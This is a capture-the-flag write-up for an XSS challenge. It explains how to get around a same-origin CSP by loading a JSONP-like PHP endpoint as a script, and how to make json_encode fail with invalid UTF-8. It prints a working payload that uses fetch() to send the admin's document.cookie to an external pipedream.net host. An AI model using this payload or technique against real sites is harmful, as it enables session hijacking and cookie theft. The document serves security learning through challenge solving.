This is a XSS challenge with a CSP policy of self. 
The way to bypass the CSP is to use the get_schedule.php endpoint as a script source, and then we will be able to use that endpoint as sort of a javascript file. 

The errormessage we give it is displayed when awakeHours is less than 0. The problem is that the data is being displayed right before we are able to inject our payload. 
```php
onSuccess($data);

if ($data["awakeHours"] <= 0 && sizeof($data['rows'])>0) {
    echo $messageOnError;
}
```

As such, we need to somehow either make the json data be interpreted as javascript, or remove it entirely. The onSuccess function uses the json_encode function to encode the data. The json_encode will return null when it fails to encode the data. We can make it fail by giving it a non valid utf-8 payload for the rows.

```
scheduleID=6&startTime=2024-11-16T08:45:07.340Z&endTime=2024-11-10T08:45:07.340Z&desc=%fc%a1%a1%a1%a1%a1
```

Then, we can inject our payload in the desc field of the first item
```html
</textarea><iframe src = "backend/get_schedule.php?errorMessage=<script src='?errorMessage=fetch(`https://eo2jsc6xk7y9tec.m.pipedream.net?${document.cookie}`)'></script>"></iframe>a
```

Since the data is limited to just the first 5 on the admin's side, we can insert our invalid data on the 6th item such that our rows will still render on the admin's side to invoke the XSS.

